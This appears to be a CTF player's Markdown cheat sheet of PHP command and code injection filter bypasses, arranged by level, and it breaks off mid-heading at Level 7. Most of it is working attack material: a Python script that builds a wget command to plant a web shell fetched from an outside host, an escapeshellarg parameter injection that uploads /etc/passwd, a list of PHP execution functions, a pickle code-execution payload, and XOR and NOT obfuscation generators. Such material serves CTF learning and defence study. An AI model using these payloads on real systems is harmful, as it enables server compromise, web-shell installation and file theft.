### My-PHP-Command-Code-Injection-Reivew

Have playing CTF for 2 years, seem long but not as much as I think. I have conduct some small experience and technique to build payload and this is about it.
The resource is plenty if not want to say overwhelming for an individual to find and read all of that and most of it often repeated the same marterial over and over.
This make things harder for development progress of academic and techicial aspect in Web Security and my self so I decided to take the knowledge that I have learned throught CTFs and trying to "system" it.
If anyone find this and love it, share with others or help me to develop it

### 01. The scenario
The scenario of this topic would be like this. 
A CTF challenge that allows you to Inject Code or Command but have some filter, you as a player need to bypass that.
I will try and devide that filter into many level that you may meet. But first you need to identify some thing

### 02. The method of identify
If you know CTF you know that ASCII is not complete. With a preg_match identify what you can do to build the payload.

```
<?php
	for ($ascii = 0; $ascii < 256; $ascii++) {
		if (!preg_match("/^[a-zA-Z0-9 \s]+$/", chr($ascii))) { // input your preg_match
			echo (chr($ascii));
			echo "\t";
		}
	}
?>
```
### Level 1. Allow all characters
This will be an easy task, when it come to this type of things, you often only need to seperate your payload and the before code

```bash 
  `   |   ||   &   &&   .   ;   -   <>   $    %0a 
```

`ls` is a way googling about it

### Level 2. Allow all characters but filted length.
You will be restricted. <?`$_GET[c]` will be too long or system('cat flag_abcxyz') would be imposible
The idea of code injection would be write the command to a file first, then use sh filename to execute the script and get the shell
or with the command injection `nl *` would be enough

Sample of devide the command:

```python
#!/usr/bin/python
#-*- coding: utf-8 -*- 
import requests 
def GetShell():
    url = "http://192.168.56.129/shell.php?1="
    fileNames = ["1.php","-O\ \\","cn\ \\","\ a.\\","wget\\"] 
    # linux创建中间有空格的文件名，需要转义，所以有请求"cn\ \\"
    # 可以修改hosts文件，让a.cn指向一个自己的服务器。
    # 在a.cn 的根目录下创建index.html ，内容是一个php shell 
    for fileName in fileNames:
        createFileUrl = url+">"+fileName
        print createFileUrl 
        requests.get(createFileUrl)
    getShUrl = url + "ls -t>1"
    print getShUrl
    requests.get(getShUrl)
    getShellUrl = url + "sh 1"
    print getShellUrl
    requests.get(getShellUrl)
    shellUrl = "http://192.168.56.129/1.php"
    response = requests.get(shellUrl)
    if response.status_code == 200:
        print "[*] Get shell !"
    else :
        print "[*] fail!"
if __name__ == "__main__":
    GetShell()
    
```

### Level 3. Wrong use of functions.
I don't know much about this thought, it is rarely meet because often need  php version 
reference:
[https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html](https://www.leavesongs.com/PENETRATION/escapeshellarg-and-parameter-injection.html)

This is the parameter injection caused by the wrong use of escapeshellarg and escapeshellcmd:

```
$url = "http://127.0.0.1/' -F file=@/etc/passwd -x 127.0.0.1:9999"; 
```

After being processed by escapeshellarg, it becomes:

```
'http://127.0.0.1/'\'' -F file=@/etc/passwd -x 127.0.0.1:9999'
```

After processing with escapeshellcmd, it becomes:
```
'http://127.0.0.1/'\\'' -F file=@/etc/passwd -x 127.0.0.1:9999\'
```
Cause the -F and -x parameters to escape single quotes, causing arbitrary file reading.

### Level 4. Allow some function or class
This is the one that I personally hate the most because it is purely bruteforce function.
This time, some function and class will allow you to execute, in this scenario try some of the following for php:

```
<?php 
  $ffi=FFI::cdef("int system(const char *command);");
  $ffi->system('ls');
?>
exec
system
passthru
shell_exec
escapeshellarg
escapeshellcmd
proc_close
proc_open
dl
popen
show_source
posix_kill
posix_mkfifo
posix_getpwuid
posix_setpgid
posix_setsid
posix_setuid
posix_setgid
posix_seteuid
posix_setegid
posix_uname
pcntl_exec
expect_popen

If Py try this maybe:
%22c__builtin__%0Aeval%0A%28S%27os.popen%28%27cat%20/var/www/flag%27%29.readlines%28%29%27%0AtR.%22


```
Also there is one more class that doing the same as execute function, but I couldn't remember it.

Using get_defined_functions can help you more 


### Level 5. Not allow alphabet and word
This time the code on 02. The method of identify would be star. Identify what chars is allow then build the function up from there. 
This time real bypass, the easiest way is using XOR of PHP

Using the code bellow and identify what you want:
```
<?php
for($i=128;$i<255;$i++){
	echo sprintf("%s^%s",urlencode(chr($i)),urlencode(chr(255)))."=>". (chr($i)^chr(255))."\n";
}
?>
```
And the code bellow for flash person in CTF (not entirely my code of course)

```
<?php
$shell = "assert";
$result1 = "";
$result2 = "";
for ($num = 0;$num <= strlen($shell);$num++)
{
    for ($x = 33;$x < 126;$x++)
    {
        if (judge(chr($x)))
        {
            for ($y = 33;$y <= 126;$y++)
            {
                if (judge(chr($y)))
                {
                    $f = chr($x) ^ chr($y);
                    if ($f == $shell[$num])
                    {
                        $result1 .= chr($x);
                        $result2 .= chr($y);
                        break 2;
                    }
                }
            }
        }
    }
}
echo $result1;
echo "<br>";
echo $result2;

function judge($c)
{
    if (!preg_match('/[a-z0-9]/is', $c))
    {
        return true;
    }
    return false;
}

```

One more thing:
PHP 5 and PHP 7 asseet() function is different 
You can do this in PHP 5 but not in PHP 7 so be careful

<?php
$x='assert'; //yes string
echo $x("phpinfo();");
?>






### Level 6. Not allow alphabet and number
This is a bit difficult and will be confuse but often because ascii is not complete, using it is an advantage 

Using reverse bytes to inject. The negative sign is ~, It's also an operator. In the binary representation of numbers, take 0 Turn into 1, take 1 Turn into 0. 

Reverse the string then reverse again in the payload. 

<?php 
$a = urlencode(~'exec'); 
echo $a; 
$b = urlencode(~'nl /*'); 
echo $b; 
//(~%9A%87%9A%9C)((~%91%93%DF%D0%D5)); 


Level 07. Some 


